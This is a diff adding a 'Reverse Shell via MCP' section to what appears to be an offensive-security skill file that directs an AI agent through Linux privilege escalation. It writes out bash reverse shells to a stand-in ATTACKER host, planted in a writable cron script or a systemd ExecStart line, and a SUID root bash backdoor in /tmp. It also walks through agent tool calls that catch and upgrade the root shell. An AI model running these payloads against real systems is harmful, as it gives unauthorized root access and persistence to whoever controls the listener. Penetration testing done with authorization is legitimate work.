@@ -637,6 +637,29 @@ cat /etc/anacrontab 2>/dev/null
 
 ## Step 8: Escalate or Pivot
 
+### Reverse Shell via MCP
+
+When cron/service abuse achieves code execution as root, **catch the escalated
+shell via the MCP shell-server** rather than polling for SUID bash or waiting
+on a local listener. Cron and service payloads execute asynchronously -- a
+reverse shell lets you catch the callback the moment the job fires.
+
+1. Call `start_listener(port=4444)` to prepare a catcher on the attackbox
+2. Write a reverse shell into the cron job or service payload:
+   ```bash
+   # Writable cron script:
+   echo '#!/bin/bash
+   bash -i >& /dev/tcp/ATTACKER/PORT 0>&1' > /path/to/cron_script.sh
+   # Or inject into systemd ExecStart:
+   ExecStart=/bin/bash -c "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"
+   ```
+3. Call `stabilize_shell(session_id=...)` to upgrade to interactive PTY
+4. Verify the new privilege level with `send_command(session_id=..., command="id")`
+
+If the target lacks outbound connectivity, use the SUID bash approach
+(`cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash`) as the cron/service
+payload and access it through an existing shell session.
+
 **Before routing**: Write `engagement/state.md` and append to
 `engagement/activity.md` with results so far. The next skill reads state.md
 on activation — stale state means duplicate work or missed context.
